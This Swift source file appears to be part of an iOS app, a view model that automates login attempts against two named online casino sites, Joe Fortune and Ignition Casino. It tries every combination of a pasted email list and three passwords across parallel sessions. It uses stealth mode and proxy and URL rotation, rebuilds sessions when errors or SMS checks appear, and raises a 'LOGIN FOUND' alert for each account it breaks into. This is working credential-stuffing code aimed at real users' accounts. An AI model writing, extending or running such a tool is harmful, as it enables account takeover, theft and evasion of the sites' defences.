import Foundation
import Observation
import SwiftUI
import UserNotifications

@Observable
@MainActor
class DualFindViewModel {
    var emails: [String] = []
    var passwords: [String] = ["", "", ""]
    var sessionCount: DualFindSessionCount = .six
    var emailInputText: String = ""

    var isRunning: Bool = false
    var isPaused: Bool = false
    var isStopping: Bool = false

    var currentEmailIndex: Int = 0
    var currentPasswordIndex: Int = 0
    var totalEmails: Int = 0

    var sessions: [DualFindSessionInfo] = []
    var logs: [PPSRLogEntry] = []
    var hits: [DualFindHit] = []
    var disabledEmails: Set<String> = []

    var showLoginFound: Bool = false
    var latestHit: DualFindHit?
    var hasResumePoint: Bool = false

    var appearanceMode: AppAppearanceMode = .dark
    var stealthEnabled: Bool = true
    var automationSettings: AutomationSettings = AutomationSettings()

    private var resumePoint: DualFindResumePoint?
    private var runTask: Task<Void, Never>?
    private let persistKey = "dual_find_resume_v1"

    private var joeEngines: [LoginAutomationEngine] = []
    private var ignitionEngines: [LoginAutomationEngine] = []

    let urlRotation = LoginURLRotationService.shared
    let proxyService = ProxyRotationService.shared
    private let notifications = PPSRNotificationService.shared
    private let logger = DebugLogger.shared
    private let backgroundService = BackgroundTaskService.shared
    private let networkFactory = NetworkSessionFactory.shared

    var progressText: String {
        guard totalEmails > 0 else { return "Ready" }
        return "Email \(currentEmailIndex + 1)/\(totalEmails) — Password \(currentPasswordIndex + 1)/3"
    }

    var progressFraction: Double {
        guard totalEmails > 0 else { return 0 }
        let totalCombos = totalEmails * 3
        let completed = (currentPasswordIndex * totalEmails) + currentEmailIndex
        return Double(completed) / Double(totalCombos)
    }

    var parsedEmailCount: Int {
        parseEmails(from: emailInputText).count
    }

    var canStart: Bool {
        parsedEmailCount > 0 && passwords.filter({ !$0.trimmingCharacters(in: .whitespaces).isEmpty }).count == 3
    }

    init() {
        notifications.requestPermission()
        loadResumePoint()
        loadSettings()
    }

    func parseEmails(from text: String) -> [String] {
        text.components(separatedBy: .newlines)
            .map { $0.trimmingCharacters(in: .whitespacesAndNewlines) }
            .filter { !$0.isEmpty && $0.contains("@") }
    }

    func startRun() {
        let parsed = parseEmails(from: emailInputText)
        guard !parsed.isEmpty else { return }
        let validPasswords = passwords.map { $0.trimmingCharacters(in: .whitespaces) }
        guard validPasswords.allSatisfy({ !$0.isEmpty }) else { return }

        emails = parsed
        totalEmails = parsed.count
        currentEmailIndex = 0
        currentPasswordIndex = 0
        disabledEmails.removeAll()
        hits.removeAll()
        logs.removeAll()
        sessions.removeAll()
        isPaused = false
        isStopping = false

        buildSessions()
        buildEngines()

        log("Starting Dual Find: \(totalEmails) emails × 3 passwords × 2 sites = \(totalEmails * 3 * 2) combinations")
        log("Session mode: \(sessionCount.label)")

        isRunning = true
        backgroundService.beginExtendedBackgroundExecution(reason: "Dual Find Account scan")

        runTask = Task {
            await executeRun(emails: emails, passwords: validPasswords)
        }
    }

    func resumeRun() {
        guard let rp = resumePoint else { return }
        emails = rp.emails
        totalEmails = rp.emails.count
        currentEmailIndex = rp.emailIndex
        currentPasswordIndex = rp.passwordIndex
        disabledEmails = Set(rp.disabledEmails)
        hits = rp.foundLogins
        sessionCount = DualFindSessionCount(rawValue: rp.sessionCount) ?? .six
        logs.removeAll()
        sessions.removeAll()
        isPaused = false
        isStopping = false

        if rp.passwords.count == 3 {
            passwords = rp.passwords
        }

        buildSessions()
        buildEngines()

        log("Resuming Dual Find from Email \(currentEmailIndex + 1)/\(totalEmails), Password \(currentPasswordIndex + 1)/3")

        isRunning = true
        backgroundService.beginExtendedBackgroundExecution(reason: "Dual Find Account resume")

        runTask = Task {
            await executeRun(emails: emails, passwords: passwords)
        }
    }

    func pauseRun() {
        isPaused = true
        log("Paused — all sessions frozen", level: .warning)
    }

    func resumeFromPause() {
        isPaused = false
        log("Resumed")
    }

    func stopRun() {
        isStopping = true
        isPaused = false
        log("Stopping — finishing current tests...", level: .warning)
    }

    func clearResumePoint() {
        resumePoint = nil
        hasResumePoint = false
        UserDefaults.standard.removeObject(forKey: persistKey)
    }

    // MARK: - Core Run Loop

    private func executeRun(emails: [String], passwords: [String]) async {
        let perSite = sessionCount.perSite

        for pwIdx in currentPasswordIndex..<3 {
            guard !isStopping else { break }
            currentPasswordIndex = pwIdx
            let password = passwords[pwIdx]
            log("=== Password Round \(pwIdx + 1)/3 ===", level: .info)

            let startIdx = (pwIdx == resumePoint?.passwordIndex) ? currentEmailIndex : 0

            for emailIdx in startIdx..<emails.count {
                guard !isStopping else { break }

                while isPaused && !isStopping {
                    try? await Task.sleep(for: .milliseconds(500))
                }
                guard !isStopping else { break }

                let email = emails[emailIdx]
                currentEmailIndex = emailIdx

                if disabledEmails.contains(email.lowercased()) {
                    log("Skipping disabled: \(email)")
                    continue
                }

                await withTaskGroup(of: Void.self) { group in
                    for i in 0..<perSite {
                        let joeIdx = i
                        let ignIdx = i

                        if joeIdx < joeEngines.count {
                            group.addTask {
                                await self.testEmailOnSite(
                                    email: email,
                                    password: password,
                                    engineIndex: joeIdx,
                                    site: .joefortune,
                                    sessionLabel: "JOE-\(joeIdx + 1)"
                                )
                            }
                        }

                        if ignIdx < ignitionEngines.count {
                            group.addTask {
                                await self.testEmailOnSite(
                                    email: email,
                                    password: password,
                                    engineIndex: ignIdx,
                                    site: .ignition,
                                    sessionLabel: "IGN-\(ignIdx + 1)"
                                )
                            }
                        }
                    }
                    await group.waitForAll()
                }

                if showLoginFound {
                    saveResumePoint()
                    log("LOGIN FOUND — run paused. Resume when ready.", level: .success)
                    isPaused = true
                    while isPaused && !isStopping {
                        try? await Task.sleep(for: .milliseconds(500))
                    }
                    if isStopping { break }
                    showLoginFound = false
                }
            }
        }

        finalizeRun()
    }

    private func testEmailOnSite(email: String, password: String, engineIndex: Int, site: LoginTargetSite, sessionLabel: String) async {
        let engines = site == .joefortune ? joeEngines : ignitionEngines
        guard engineIndex < engines.count else { return }
        let engine = engines[engineIndex]

        let sessionInfoId = "\(site == .joefortune ? "Joe Fortune" : "Ignition Casino")_\(engineIndex)"
        updateSession(id: sessionInfoId, email: email, status: "Testing", active: true)

        let cred = LoginCredential(username: email, password: password)
        let attempt = LoginAttempt(credential: cred, sessionIndex: engineIndex + 1)

        let wasIgnition = urlRotation.isIgnitionMode
        urlRotation.isIgnitionMode = (site == .ignition)
        let testURL = urlRotation.nextURL() ?? site.url
        urlRotation.isIgnitionMode = wasIgnition

        engine.proxyTarget = (site == .joefortune) ? .joe : .ignition

        let outcome = await engine.runLoginTest(attempt, targetURL: testURL, timeout: 10)

        switch outcome {
        case .success:
            let hit = DualFindHit(email: email, password: password, platform: site.rawValue)
            hits.append(hit)
            latestHit = hit
            showLoginFound = true
            log("🎯 LOGIN FOUND: \(email) on \(site.rawValue)", level: .success)
            sendLoginFoundNotification(email: email, platform: site.rawValue)
            updateSession(id: sessionInfoId, email: email, status: "HIT!", active: false)

        case .permDisabled:
            disabledEmails.insert(email.lowercased())
            log("\(sessionLabel) \(email) — DISABLED (eliminated from all testing)", level: .error)
            updateSession(id: sessionInfoId, email: email, status: "Disabled", active: false)

        case .tempDisabled:
            let content = attempt.responseSnippet?.lowercased() ?? ""
            if content.contains("disabled") {
                disabledEmails.insert(email.lowercased())
                log("\(sessionLabel) \(email) — disabled keyword found, eliminated", level: .error)
                updateSession(id: sessionInfoId, email: email, status: "Disabled", active: false)
            } else {
                log("\(sessionLabel) \(email) — temp issue, will retry", level: .warning)
                await retryOnTransientError(email: email, password: password, engineIndex: engineIndex, site: site, sessionLabel: sessionLabel)
            }

        case .timeout, .connectionFailure, .redBannerError:
            log("\(sessionLabel) \(email) — transient error (\(outcome)), burning session & retrying", level: .warning)
            await retryOnTransientError(email: email, password: password, engineIndex: engineIndex, site: site, sessionLabel: sessionLabel)

        case .unsure:
            let snippet = (attempt.responseSnippet ?? "").lowercased()
            if snippet.contains("error") || snippet.contains("sms") {
                log("\(sessionLabel) \(email) — ERROR/SMS detected, burning & retrying", level: .warning)
                await retryOnTransientError(email: email, password: password, engineIndex: engineIndex, site: site, sessionLabel: sessionLabel)
            } else {
                log("\(sessionLabel) \(email) — no account (password \(currentPasswordIndex + 1))", level: .info)
                updateSession(id: sessionInfoId, email: email, status: "No Acc", active: false)
            }

        case .noAcc:
            log("\(sessionLabel) \(email) — no account (password \(currentPasswordIndex + 1))", level: .info)
            updateSession(id: sessionInfoId, email: email, status: "No Acc", active: false)
        }
    }

    private func retryOnTransientError(email: String, password: String, engineIndex: Int, site: LoginTargetSite, sessionLabel: String) async {
        let engines = site == .joefortune ? joeEngines : ignitionEngines
        guard engineIndex < engines.count else { return }

        let sessionInfoId = "\(site == .joefortune ? "Joe Fortune" : "Ignition Casino")_\(engineIndex)"
        updateSession(id: sessionInfoId, email: email, status: "Rebuilding", active: true)

        let freshEngine = LoginAutomationEngine()
        freshEngine.debugMode = automationSettings.trueDetectionEnabled
        freshEngine.stealthEnabled = stealthEnabled
        freshEngine.automationSettings = automationSettings
        freshEngine.proxyTarget = (site == .joefortune) ? .joe : .ignition
        wireEngineCallbacks(freshEngine, label: sessionLabel)

        if site == .joefortune {
            joeEngines[engineIndex] = freshEngine
        } else {
            ignitionEngines[engineIndex] = freshEngine
        }

        let cred = LoginCredential(username: email, password: password)
        let attempt = LoginAttempt(credential: cred, sessionIndex: engineIndex + 1)

        let wasIgnition = urlRotation.isIgnitionMode
        urlRotation.isIgnitionMode = (site == .ignition)
        let testURL = urlRotation.nextURL() ?? site.url
        urlRotation.isIgnitionMode = wasIgnition

        let outcome = await freshEngine.runLoginTest(attempt, targetURL: testURL, timeout: 10)

        switch outcome {
        case .success:
            let hit = DualFindHit(email: email, password: password, platform: site.rawValue)
            hits.append(hit)
            latestHit = hit
            showLoginFound = true
            log("🎯 LOGIN FOUND (retry): \(email) on \(site.rawValue)", level: .success)
            sendLoginFoundNotification(email: email, platform: site.rawValue)
            updateSession(id: sessionInfoId, email: email, status: "HIT!", active: false)

        case .permDisabled:
            disabledEmails.insert(email.lowercased())
            log("\(sessionLabel) retry: \(email) — DISABLED (eliminated)", level: .error)
            updateSession(id: sessionInfoId, email: email, status: "Disabled", active: false)

        default:
            log("\(sessionLabel) retry: \(email) — \(outcome) (moving on)", level: .warning)
            updateSession(id: sessionInfoId, email: email, status: "Done", active: false)
        }
    }

    // MARK: - Session Management

    private func buildSessions() {
        sessions.removeAll()
        let perSite = sessionCount.perSite
        for i in 0..<perSite {
            sessions.append(DualFindSessionInfo(index: i, platform: "Joe Fortune"))
        }
        for i in 0..<perSite {
            sessions.append(DualFindSessionInfo(index: i, platform: "Ignition Casino"))
        }
    }

    private func buildEngines() {
        joeEngines.removeAll()
        ignitionEngines.removeAll()
        let perSite = sessionCount.perSite

        for i in 0..<perSite {
            let engine = LoginAutomationEngine()
            engine.debugMode = automationSettings.trueDetectionEnabled
            engine.stealthEnabled = stealthEnabled
            engine.automationSettings = automationSettings
            engine.proxyTarget = .joe
            wireEngineCallbacks(engine, label: "JOE-\(i + 1)")
            joeEngines.append(engine)
        }

        for i in 0..<perSite {
            let engine = LoginAutomationEngine()
            engine.debugMode = automationSettings.trueDetectionEnabled
            engine.stealthEnabled = stealthEnabled
            engine.automationSettings = automationSettings
            engine.proxyTarget = .ignition
            wireEngineCallbacks(engine, label: "IGN-\(i + 1)")
            ignitionEngines.append(engine)
        }
    }

    private func wireEngineCallbacks(_ engine: LoginAutomationEngine, label: String) {
        engine.onLog = { [weak self] message, level in
            self?.log("[\(label)] \(message)", level: level)
        }
        engine.onURLFailure = { [weak self] urlString in
            self?.urlRotation.reportFailure(urlString: urlString)
        }
        engine.onURLSuccess = { [weak self] urlString in
            self?.urlRotation.reportSuccess(urlString: urlString)
        }
        engine.onResponseTime = { [weak self] urlString, duration in
            self?.urlRotation.reportResponseTime(urlString: urlString, duration: duration)
        }
        engine.onBlankScreenshot = { [weak self] urlString in
            self?.urlRotation.reportFailure(urlString: urlString)
            self?.log("[\(label)] Blank screenshot — URL rotated", level: .warning)
        }
    }

    private func updateSession(id: String, email: String, status: String, active: Bool) {
        if let idx = sessions.firstIndex(where: { $0.id == id }) {
            sessions[idx].currentEmail = email
            sessions[idx].status = status
            sessions[idx].isActive = active
        }
    }

    // MARK: - Finalize

    private func finalizeRun() {
        isRunning = false
        isPaused = false
        let stoppedEarly = isStopping
        isStopping = false
        backgroundService.endExtendedBackgroundExecution()

        let totalTested = (currentPasswordIndex * totalEmails) + currentEmailIndex
        let totalPossible = totalEmails * 3

        if stoppedEarly {
            log("Run stopped: \(hits.count) hits, \(disabledEmails.count) disabled, tested \(totalTested)/\(totalPossible)", level: .warning)
            saveResumePoint()
        } else {
            log("Run complete: \(hits.count) hits found, \(disabledEmails.count) disabled, \(totalPossible) combinations tested", level: .success)
            clearResumePoint()
        }

        notifications.sendBatchComplete(working: hits.count, dead: disabledEmails.count, requeued: 0)
    }

    // MARK: - Persistence

    private func saveResumePoint() {
        let rp = DualFindResumePoint(
            emailIndex: currentEmailIndex,
            passwordIndex: currentPasswordIndex,
            emails: emails,
            passwords: passwords,
            sessionCount: sessionCount.rawValue,
            timestamp: Date(),
            disabledEmails: Array(disabledEmails),
            foundLogins: hits
        )
        if let data = try? JSONEncoder().encode(rp) {
            UserDefaults.standard.set(data, forKey: persistKey)
        }
        resumePoint = rp
        hasResumePoint = true
    }

    private func loadResumePoint() {
        guard let data = UserDefaults.standard.data(forKey: persistKey),
              let rp = try? JSONDecoder().decode(DualFindResumePoint.self, from: data) else {
            hasResumePoint = false
            return
        }
        resumePoint = rp
        hasResumePoint = true
        emailInputText = rp.emails.joined(separator: "\n")
        if rp.passwords.count == 3 {
            passwords = rp.passwords
        }
        sessionCount = DualFindSessionCount(rawValue: rp.sessionCount) ?? .six
    }

    private func loadSettings() {
        if let data = UserDefaults.standard.data(forKey: "automation_settings_v1"),
           let loaded = try? JSONDecoder().decode(AutomationSettings.self, from: data) {
            automationSettings = loaded
        }
    }

    // MARK: - Notifications

    private func sendLoginFoundNotification(email: String, platform: String) {
        let content = UNMutableNotificationContent()
        content.title = "LOGIN FOUND"
        content.body = "\(email) on \(platform)"
        content.sound = .defaultCritical
        let request = UNNotificationRequest(identifier: UUID().uuidString, content: content, trigger: nil)
        UNUserNotificationCenter.current().add(request)
    }

    // MARK: - Logging

    func log(_ message: String, level: PPSRLogEntry.Level = .info) {
        let entry = PPSRLogEntry(message: message, level: level)
        logs.insert(entry, at: 0)
        if logs.count > 2000 {
            logs.removeLast(logs.count - 2000)
        }
        let debugLevel: DebugLogLevel
        switch level {
        case .info: debugLevel = .info
        case .success: debugLevel = .success
        case .warning: debugLevel = .warning
        case .error: debugLevel = .error
        }
        logger.log("[DualFind] \(message)", category: .login, level: debugLevel)
    }
}
